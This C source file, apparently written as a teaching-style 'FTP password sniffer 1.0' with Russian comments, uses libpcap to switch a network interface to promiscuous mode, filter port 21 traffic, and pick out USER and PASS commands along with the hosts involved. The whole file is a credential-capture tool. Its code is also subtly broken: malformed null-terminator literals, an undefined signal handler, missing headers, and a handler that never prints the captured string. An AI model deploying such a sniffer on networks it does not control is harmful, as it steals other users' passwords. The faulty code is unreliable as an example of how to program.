/*
 * ftpsniff.c
 *
 *      Author: dmitry
 */

#include <pcap.h>
#include <stdio.h>

#define MAXLEN 1500 // максимальная длинна читаемого с интерфейса пакета (MTU)
#define TIMEOUT 500 // таймаут чтения с интерфейса
#define IP_H sizeof(struct ip)
#define ETH_H 14
#define TCP_H sizeof(struct tcphdr)

void handler(char *user, struct pcap_pkthdr *pkthdr, u_char *packet) // обработчик пакетов
{
	struct ip *ip; // структура IPv4 заголовка
	char *data;
	char string[32];
	int i;

	ip = (struct ip *)(packet + ETH_H); // забиваем структуру ip с оффсетом длины заголовка канального уровня (Ethernet)
	data = (char *)(packet + ETH_H + IP_H + TCP_H); // получаем указатель на информацию в пакете

	if ((strncmp(data, "USER", 4) == 0) || (strncmp(data, "PASS", 4) == 0) ||
			(strncmp(data, "pass", 4) == 0)) { // ищем в пакете строчки USER или PASS
		if (pkthdr->len - ETH_H - IP_H - TCP_H > 32) {
			return;
		}

		printf("FTP: %s -> ", inet_ntoa(ip->ip_src));
		printf("%s\n", inet_ntoa(ip->ip_dst));
		memset(string, 0, 32);
		strncpy(string, data, 32);

	}
}

void sighandler(); // обработчик сигналов
pcap_t *fd; // дескриптор интерфейса

char *copy_argv(char **argv)
{
	char **p, *buf, *src, *dst;
	u_int len = 0;
	p = argv;

	if (*p == 0) {
		return 0;
	}

	while (*p) {
		len += strlen(*p++) + 1;
	}

	if ((buf = (char *)malloc(len)) == NULL) {
		err(1, "copy_argv: malloc");
	}

	p = argv;
	dst = buf;

	while ((src = *p++) != NULL) {
		while ((*dst++ = *src++) != '0');
		dst[-1] = '';
	}

	dst[-1] = '0';
	return buf;
}

int main(int argc, char *argv[])
{
	struct bpf_program bpf_fil; // структура для фильтра
	char err[PCAP_ERRBUF_SIZE]; // буфер для записи ошибок
	char *device; // буфер, в котором будет находиться название интерфейса
	bpf_u_int32 net, mask; // номер сети и маска
	pcap_handler process; // обработчик пакетов

	/* выбираем сетевой интерфейс среди полученных функцией
	pcap_lookupdev, или устанавливаем заданный вручную */
	if (argc < 2) {
		printf("FTP password sniffer 1.0\n");
		printf("Usage: %s \n", argv[0]);
		device = pcap_lookupdev(err);

		if (device == NULL) {
			printf("pcap_lookupdev error: %s\n", err);
			exit(0);
		}

		printf("Interface not defined, using default\n");
	}
	else {
		device = (char *)calloc(3, 3);
		strncpy(device, argv[1], 3);
		printf("Using device: %s\n", device);
	}

	process = (pcap_handler)handler; // получаем указатель на функцию обработчик

	// открываем интерфейс и ставим его в PROMISC режим (3 аргумент единица)
	if ((fd = pcap_open_live(device, MAXLEN, 1, TIMEOUT, err)) == NULL) {
		printf("Can't open device %s\n", err);
		exit(0);
	}

	signal(SIGINT, sighandler); // сигнал INT будет обработан функцией sighandler

	/* для начала сделаем, что бы прорамма работала только на Ethernet,
	т.к. придется немного повозиться с размерами фреймов канального уровня,
	используемого на интерфейсе */
	if (pcap_datalink(fd) != DLT_EN10MB) {
		printf("Only Ethernet supported!\n");
		pcap_close(fd); // закрываем интерфейс
		exit(0);
	}

	// получаем номер сети и маску сети
	if ((pcap_lookupnet(device, &net, &mask, err)) < 0) {
		printf("pcap_lookupnet error: %s\n", err);
		pcap_close(fd);
		exit(0);
	}

	// встраиваем фильтр на IPv4 TCP порт 21
	if ((pcap_compile(fd, &bpf_fil, "ip proto TCP and port 21", 1, mask)) < 0) {
		pcap_perror(fd, "pcap_compile");
		pcap_close(fd);
		exit(0);
	}

	// применяем фильтр
	if ((pcap_setfilter(fd, &bpf_fil)) < 0) {
		pcap_perror(fd, "pcap_setfilter");
		pcap_close(fd);
		exit(0);
	}

	if (pcap_loop(fd, -1, process, NULL)) {
		pcap_perror(fd, "pcap_loop");
		pcap_close(fd);
		exit(0);
	}

	return 0;
}
